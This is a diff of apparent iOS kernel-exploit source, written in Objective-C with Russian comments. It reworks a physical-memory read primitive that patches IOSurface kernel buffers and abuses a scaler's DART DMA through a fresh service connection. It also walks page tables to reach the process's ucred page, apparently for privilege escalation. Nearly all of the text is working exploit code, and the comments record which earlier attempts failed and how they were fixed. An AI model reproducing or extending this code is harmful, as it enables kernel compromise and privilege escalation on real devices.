@@ -148,10 +148,22 @@ static uint64_t kpZoneVtoP(uint64_t va)
 // → prepare full-map → сериализация из её record buffer). Патчим её буфер на
 // targetPA>>14 ДО первого submit: DMA читает deadly-страницу как контент src
 // и кладёт в dstS. Поверхность выпускаем после чтения.
-static BOOL kpPhysRead16K(io_connect_t victim, const uint8_t *tsdV, uint32_t dstID, IOSurfaceRef dstS,
-                          uint64_t ttM, uint64_t isTable, uint64_t targetPA, uint8_t *out, NSMutableString *r)
+// 1.9.257 (р.64): physread 16KB через DART — СВЕЖИЙ pipe + СВЕЖАЯ поверхность.
+// Расклад промахов 252-256 (всё по р.64): (a) swap-оп дропается молча; (b) src
+// ре-маппится каждый оп из cmd-кэша (off,len) — поверхность тех же dims ловит
+// кэш-хит на ЧУЖОЙ маппинг (sig=0x41 = пиксели srcS); (c) dst-маппинг на текущем
+// pipe персистентен и остался ctlPA после CONFIRMED — запись вообще не в dstS.
+// Лечение: restore dst-записи в оригинал + НОВЫЙ коннекшн к скейлеру (пустой
+// pipe = пустые cmd/LRU кэши) + свежая поверхность-жертва (гарантированный
+// full-map из её record buffer): DMA читает deadly-страницу как контент src
+// и кладёт её в dstS-реальный backing, который читаем с юзер-стороны.
+static BOOL kpPhysRead16K(io_service_t svc, uint64_t dstBuf, uint64_t dstOldQ, const uint8_t *tsdV,
+                          uint32_t dstID, IOSurfaceRef dstS, uint64_t ttM, uint64_t isTable,
+                          uint64_t targetPA, uint8_t *out, NSMutableString *r)
 {
     memset(out, 0, 0x4000);
+    // dst entry[0] → оригинал: на свежем pipe dst смаппится в РЕАЛЬНЫЙ backing
+    if (dstBuf) early_kwrite64(dstBuf + 0x30, dstOldQ);
     NSDictionary *spB = @{(__bridge id)kIOSurfaceWidth: @1024, (__bridge id)kIOSurfaceHeight: @128,
                           (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
     IOSurfaceRef rdS = IOSurfaceCreate((__bridge CFDictionaryRef)spB);
@@ -159,7 +171,6 @@ static BOOL kpPhysRead16K(io_connect_t victim, const uint8_t *tsdV, uint32_t dst
     BOOL done = NO;
     uint64_t rdVA = 0, rdBuf = 0;
     uint32_t rdID = IOSurfaceGetID(rdS);
-    // SendRight-хоп: IOSurfaceCreateMachPort → kobj → fobj(+0x30) vt==SendRight → [+0x18], verify [+0x10]==rdID
     typedef mach_port_t (*CreateMachPort_t)(IOSurfaceRef);
     CreateMachPort_t pCmp = (CreateMachPort_t)dlsym(RTLD_DEFAULT, "IOSurfaceCreateMachPort");
     mach_port_t mp = pCmp ? pCmp(rdS) : 0;
@@ -181,16 +192,12 @@ static BOOL kpPhysRead16K(io_connect_t victim, const uint8_t *tsdV, uint32_t dst
         rpix = (uint8_t *)IOSurfaceGetBaseAddress(rdS);
         IOSurfaceUnlock(rdS, 0, NULL);
         uint64_t rdPA = (rpix && ttM) ? vtophys(ttM, (uint64_t)rpix) : 0;
-        uint32_t rdPfn32 = (uint32_t)(rdPA >> 14);
         uint64_t pd = kp_untag_ptr(early_kread64(rdVA + 0x30));
         uint64_t typ = pd ? (early_kread64(pd + 0x20) & 0xf0) : 0;
         uint64_t hdr = (typ == 0x10) ? kp_untag_ptr(early_kread64(pd + 0x90)) : 0;
         uint64_t buf = hdr ? kp_untag_ptr(early_kread64(hdr + 0x10)) : 0;
         uint32_t cnt = buf ? (uint32_t)early_kread64(buf + 0x28) : 0;
         uint64_t e0 = buf ? early_kread64(buf + 0x30) : 0;
-        // 1.9.255b: точное pfn-равенство роняло маркеры при rdPA=0/расхождении
-        // vtophys на свежей поверхности (rdVA уже верифицирован по rdID — цепочка
-        // наша). Достаточно формы записи: lo32≠0, hi32∈{0,4}.
         BOOL ok = buf && cnt && cnt < 0x1000 && (uint32_t)e0 != 0 &&
                   ((uint32_t)(e0 >> 32) == 0 || (uint32_t)(e0 >> 32) == 4);
         kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA=%#llx rdPA=%#llx type=%#llx buf=%#llx cnt=%#x entry0=%#018llx — %@",
@@ -198,35 +205,42 @@ static BOOL kpPhysRead16K(io_connect_t victim, const uint8_t *tsdV, uint32_t dst
                   (unsigned long long)e0, ok ? @"OK" : @"маркеры МИМО"]);
         if (ok) rdBuf = buf;
     }
-    if (rdBuf && victim != IO_OBJECT_NULL) {
-        uint64_t tpage = targetPA & ~0x3fffULL;
-        uint64_t eSave = early_kread64(rdBuf + 0x30);
-        usleep(1500);
-        early_kwrite64(rdBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
-        uint8_t fR = 0; kreadbuf(rdBuf + 0x2d, &fR, 1);
-        uint64_t flSave = 0;
-        if (fR & 0x02) {
-            flSave = early_kread64(rdBuf + 0x28);
-            early_kwrite64(rdBuf + 0x28, (flSave & ~(0xffULL << 40)) | ((uint64_t)(fR & ~0x02) << 40));
+    if (rdBuf) {
+        io_connect_t v2 = IO_OBJECT_NULL;
+        kern_return_t ok2 = IOServiceOpen(svc, mach_task_self(), 0, &v2);
+        if (ok2 == KERN_SUCCESS && v2) {
+            uint64_t tpage = targetPA & ~0x3fffULL;
+            uint64_t eSave = early_kread64(rdBuf + 0x30);
+            usleep(1500);
+            early_kwrite64(rdBuf + 0x30, (eSave & 0xffffffff00000000ULL) | (uint32_t)(tpage >> 14));
+            uint8_t fR = 0; kreadbuf(rdBuf + 0x2d, &fR, 1);
+            uint64_t flSave = 0;
+            if (fR & 0x02) {
+                flSave = early_kread64(rdBuf + 0x28);
+                early_kwrite64(rdBuf + 0x28, (flSave & ~(0xffULL << 40)) | ((uint64_t)(fR & ~0x02) << 40));
+            }
+            uint8_t tsdR[0x1B0];
+            memcpy(tsdR, tsdV, sizeof(tsdR));
+            *(uint32_t *)(tsdR + 0) = rdID;
+            *(uint32_t *)(tsdR + 4) = dstID;
+            *(uint64_t *)(tsdR + 8) = 1;
+            *(uint32_t *)(tsdR + 0x0C) = 64;
+            *(uint32_t *)(tsdR + 0x10) = 64;
+            kern_return_t rkr = IOConnectCallMethod(v2, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
+            usleep(400000);
+            early_kwrite64(rdBuf + 0x30, eSave);
+            if (flSave) early_kwrite64(rdBuf + 0x28, flSave);
+            IOServiceClose(v2);
+            IOSurfaceLock(dstS, 0, NULL);
+            uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
+            if (spR) memcpy(out, spR, 0x4000);
+            IOSurfaceUnlock(dstS, 0, NULL);
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x (fresh pipe)",
+                      (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
+            done = YES;
+        } else {
+            kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] fresh pipe: open kr=0x%x", ok2]);
         }
-        uint8_t tsdR[0x1B0];
-        memcpy(tsdR, tsdV, sizeof(tsdR));
-        *(uint32_t *)(tsdR + 0) = rdID;
-        *(uint32_t *)(tsdR + 4) = dstID;
-        *(uint64_t *)(tsdR + 8) = 1;
-        *(uint32_t *)(tsdR + 0x0C) = 64;
-        *(uint32_t *)(tsdR + 0x10) = 64;
-        kern_return_t rkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdR, sizeof(tsdR), NULL, NULL, NULL, NULL);
-        usleep(400000);
-        early_kwrite64(rdBuf + 0x30, eSave);
-        if (flSave) early_kwrite64(rdBuf + 0x28, flSave);
-        IOSurfaceLock(dstS, 0, NULL);
-        uint8_t *spR = (uint8_t *)IOSurfaceGetBaseAddress(dstS);
-        if (spR) memcpy(out, spR, 0x4000);
-        IOSurfaceUnlock(dstS, 0, NULL);
-        kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] target=%#llx kr=0x%x sig=%#010x flags=%#x",
-                  (unsigned long long)targetPA, rkr, *(uint32_t *)out, fR]);
-        done = YES;
     } else {
         kpNote(r, [NSString stringWithFormat:@"  [PHYSREAD] rdVA/rdBuf нет (rdVA=%#llx) — чтение пропущено", (unsigned long long)rdVA]);
     }
@@ -7805,19 +7819,20 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 if (!pagePA) pagePA = kpZoneVtoP(pageVA);
                 // 1.9.252: walker встал на deadly-таблице (errno 1042) — читаем её
                 // через DART-копию (kpPhysRead16K), leaf PTE сама отдаёт ucredPA.
-                if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && victim != IO_OBJECT_NULL) {
+                if (!pagePA && errF == 1042 && kp_lastDeadlyTte && isTable && svc) {
                     uint64_t tpage = kp_lastDeadlyTte & ~0x3fffULL;
                     uint32_t tidx = (uint32_t)(kp_lastDeadlyTte & 0x3fff) / 8;
                     uint8_t timg[0x4000];
+                    uint64_t dq252 = buf247 ? ((early_kread64(buf247 + 0x30) & 0xffffffff00000000ULL) | pfn32) : 0;
                     kpNote(r, [NSString stringWithFormat:@"  [FORGE] walker встал на L%d tte=%#llx — physread через DART",
                               kp_lastDeadlyLvl, (unsigned long long)kp_lastDeadlyTte]);
-                    if (kpPhysRead16K(victim, tsdV, dstID, dstS, ttM, isTable, tpage, timg, r)) {
+                    if (kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, tpage, timg, r)) {
                         uint64_t pte = 0; memcpy(&pte, timg + (uint64_t)tidx * 8, 8);
                         if (kp_lastDeadlyLvl == 2 && (pte & 0x3) == 0x3) {   // L2-запись → L3 таблица
                             uint64_t l3pa = pte & 0x0000ffffffffc000ULL;
                             uint32_t l3idx = (uint32_t)((pageVA >> 14) & 0x7ff);
                             kpNote(r, [NSString stringWithFormat:@"  [FORGE] L2[%u] → L3 таблица %#llx, читаю её", tidx, (unsigned long long)l3pa]);
-                            if (!kpPhysRead16K(victim, tsdV, dstID, dstS, ttM, isTable, l3pa, timg, r)) pte = 0;
+                            if (!kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, l3pa, timg, r)) pte = 0;
                             else memcpy(&pte, timg + (uint64_t)l3idx * 8, 8);
                         }
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] leaf PTE = %#018llx", pte]);
@@ -7833,9 +7848,9 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 BOOL paOK = (q0a == q0b) && (uidViaPA == (uint32_t)getuid());
                 // 1.9.252: кросс-валидация через DART-read, если physmap-алиас ucred
                 // страницы сам охраняется (pkva=0 или q0a не сошёлся).
-                if (!paOK && pagePA && victim != IO_OBJECT_NULL) {
+                if (!paOK && pagePA && svc) {
                     uint8_t cimg[0x4000];
-                    if (kpPhysRead16K(victim, tsdV, dstID, dstS, ttM, isTable, pagePA, cimg, r)) {
+                    if (kpPhysRead16K(svc, buf247, dq252, tsdV, dstID, dstS, ttM, isTable, pagePA, cimg, r)) {
                         uint64_t q0c = 0; memcpy(&q0c, cimg, 8);
                         uint32_t uidViaC = 0; memcpy(&uidViaC, cimg + uoff + 0x18, 4);
                         if (q0c == q0b && uidViaC == (uint32_t)getuid()) {
